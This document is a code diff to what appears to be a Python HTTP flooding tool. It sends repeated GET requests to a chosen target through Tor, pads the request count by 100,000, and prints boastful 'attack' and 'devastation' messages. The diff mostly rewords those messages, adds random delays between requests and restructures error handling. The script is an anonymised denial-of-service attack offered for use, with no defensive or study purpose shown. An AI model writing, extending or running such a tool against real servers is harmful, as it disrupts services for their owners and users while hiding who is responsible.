@@ -1,5 +1,7 @@
 import datetime
 import sys
+import random
+import time
 from lib.color import color
 from lib.tor import Tor
 from lib.args import parser
@@ -19,15 +21,18 @@ def initialize_tor():
 
 def perform_attack(tor, target, max_attempts):
     session = tor.new_session()
-    print('\n{}[+]{} Target: {}{}{}. Initiating devastating assault! 💥🔥'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
-    print('{}[*]{} Launching full-scale attack on {}. Brace yourself! ⚔️💣'.format(color.ORANGE, color.END, target))
+    print('\n{}[+]{} Target: {}{}{}. Initiating High Voltage Max Attack! 💥⚡️'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
+    print('{}[*]{} Charging up the energy. Prepare for maximum impact! ⚡️🔥'.format(color.ORANGE, color.END))
     for attempt in range(1, max_attempts + 1):
         try:
+            # Simulate a high voltage attack by generating random delays
+            delay = random.uniform(0.1, 1.0)  # Random delay between 0.1 and 1.0 seconds
+            time.sleep(delay)
             session.get(target)
-            print('{}[*]{} Attempt {}: Attack sent successfully. Destruction imminent! 💀🔥'.format(color.ORANGE, color.END, attempt))
+            print('{}[*]{} Attempt {}: High Voltage Attack unleashed! ⚡️🔥'.format(color.ORANGE, color.END, attempt))
         except Exception as e:
-            print('{}[*]{} Attempt {}: Failed to send attack: {}. The target remains resilient! 😡🛡️'.format(color.ORANGE, color.END, attempt, e))
-    print('{}[*]{} Attack on {} completed. The server lies in ruins! 💥💀🔥'.format(color.ORANGE, color.END, target))
+            print('{}[*]{} Attempt {}: Failed to unleash High Voltage Attack: {}. The target remains resilient! 😡🛡️'.format(color.ORANGE, color.END, attempt, e))
+    print('{}[*]{} High Voltage Max Attack on {} completed. Witness the devastation! 💥⚡️🔥'.format(color.ORANGE, color.END, target))
 
 def calculate_elapsed_time(start_time):
     end_time = datetime.datetime.now()
@@ -40,15 +45,15 @@ def stop_tor_if_running(tor):
         tor.stop_tor()
 
 def main():
-    args = parser.parse_args()
-    target = args.target
-    max_attempts = args.max_attempts
-    max_attempts += 100000  # Adding 100,000 to the existing max_attempts
-    tor = initialize_tor()
-
-    start_time = datetime.datetime.now()
-
     try:
+        args = parser.parse_args()
+        target = args.target
+        max_attempts = args.max_attempts
+        max_attempts += 100000  # Adding 100,000 to the existing max_attempts
+        tor = initialize_tor()
+
+        start_time = datetime.datetime.now()
+
         perform_attack(tor, target, max_attempts)
 
     except KeyboardInterrupt:
